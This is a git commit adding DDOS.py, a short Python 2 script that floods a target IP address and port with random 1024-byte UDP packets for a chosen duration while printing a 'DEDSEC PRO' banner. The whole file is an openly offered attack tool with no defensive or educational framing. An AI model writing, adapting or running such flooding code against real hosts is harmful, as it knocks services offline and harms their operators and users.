7cc73ed5323c1d916845ee71ac8cf9fa89e14129
dedsecproyt <60039962+dedsecproyt@users.noreply.github.com>
2020-06-27 11:50:31 +0300

    Add files via upload

---
+++ DDOS.py
@@ -0,0 +1,35 @@
+import time
+import socket
+import random
+import sys
+
+def usage():
+    
+    print " BY DEDSEC PRO"
+    print " ip port packet"
+
+def flood(victim, vport, duration):
+    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    bytes = random._urandom(1024)
+    timeout =  time.time() + duration
+    sent = 3000
+
+    while 1:
+        if time.time() > timeout:
+            break
+        else:
+            pass
+        client.sendto(bytes, (victim, vport))
+        sent = sent + 1
+        print "BYDEDSEC PRO %s DDOS %s port %s "%(sent, victim, vport)
+
+def main():
+    print len(sys.argv)
+    if len(sys.argv) != 4:
+        usage()
+    else:
+        flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))
+
+if __name__ == '__main__':
+    main()
+
